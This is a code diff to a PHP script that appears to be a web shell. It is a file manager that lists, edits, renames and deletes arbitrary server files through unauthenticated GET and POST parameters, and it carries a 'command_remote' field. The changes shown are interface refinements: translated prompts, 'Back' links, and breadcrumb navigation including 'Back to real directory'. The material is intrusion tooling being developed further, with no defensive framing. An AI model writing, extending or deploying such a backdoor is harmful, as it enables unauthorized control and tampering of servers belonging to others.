@@ -76,6 +76,7 @@ $command_remote = isset($_POST['command_remote']) ? $_POST['command_remote'] : '
 $file = isset($_GET['file']) ? $_GET['file'] : '';
 
 echo '<div><strong>Root Directory:</strong> ' . $_SERVER['DOCUMENT_ROOT'] . '</div>';
+echo '<div><strong>Now Path:</strong> ' . $path . '</div>';
 
 function getPermissions($file) {
     $perms = fileperms($file);
@@ -121,7 +122,7 @@ function listDirectory($path) {
         }
         if ($isDir) {
             foreach (['delete' => 'Delete', 'rename' => 'Rename'] as $action => $label) {
-                echo "<a href='?action=$action&dir=" . urlencode($filePath) . "&path=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin $label folder ini?\")'>$label</a> ";
+                echo "<a href='?action=$action&dir=" . urlencode($filePath) . "&path=" . urlencode($path) . "' onclick='return confirm(\"Are you sure to $label this folder?\")'>$label</a> ";
             }
         }
         echo '</td>';
@@ -201,6 +202,7 @@ if ($action === 'rename' && isset($_GET['dir'])) {
               <button type='submit' name='rename'>Rename</button>
             </form>
           </body>";
+    echo '<a href="?path=' . urlencode($path) . '">Back</a>';
     if (isset($_POST['rename'])) {
         $newPath = dirname($_GET['dir']) . '/' . basename($_POST['new_name']);
         rename($_GET['dir'], $newPath);
@@ -246,7 +248,7 @@ if ($action === 'edit' && !empty($file)) {
         echo '        <textarea name="content" rows="40" cols="175">' . htmlspecialchars($content) . '</textarea><br>';
         echo '        <input type="submit" value="Save">';
         echo '    </form>';
-        echo '    <a href="?path=' . urlencode($path) . '">Cancel</a>';
+        echo '    <a href="?path=' . urlencode($path) . '">Back</a>';
         echo '</body>';
     }
     exit;
@@ -275,7 +277,7 @@ if ($action === 'rename' && !empty($file)) {
         echo '<input type="text" name="new_name" value="' . basename($file) . '"><br>';
         echo '<input type="submit" value="Rename">';
         echo '</form>';
-        echo '<a href="?path=' . urlencode($path) . '">Cancel</a>';
+        echo '<a href="?path=' . urlencode($path) . '">Back</a>';
         echo '</body>';
     }
     exit;
@@ -441,7 +443,16 @@ ob_end_flush();
 
     <!-- File Listing -->
     <div>
-        <?php echo '<h2>Directory:</h2>'.$path; ?>
+        <?php
+        echo '<h2>Short-Access:</h2>';
+        $path_parts = explode("/", $path);
+        $current_path = "";
+        foreach ($path_parts as $part) {
+            $current_path .= "/$part";
+            echo '<a href="?path=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>/';
+        }
+        echo '<br><a href="?path=' . urlencode($_SERVER['DOCUMENT_ROOT']) . '">Back to real directory</a><br>';
+        ?>
         <?php listDirectory($path); ?>
     </div>
 </body>
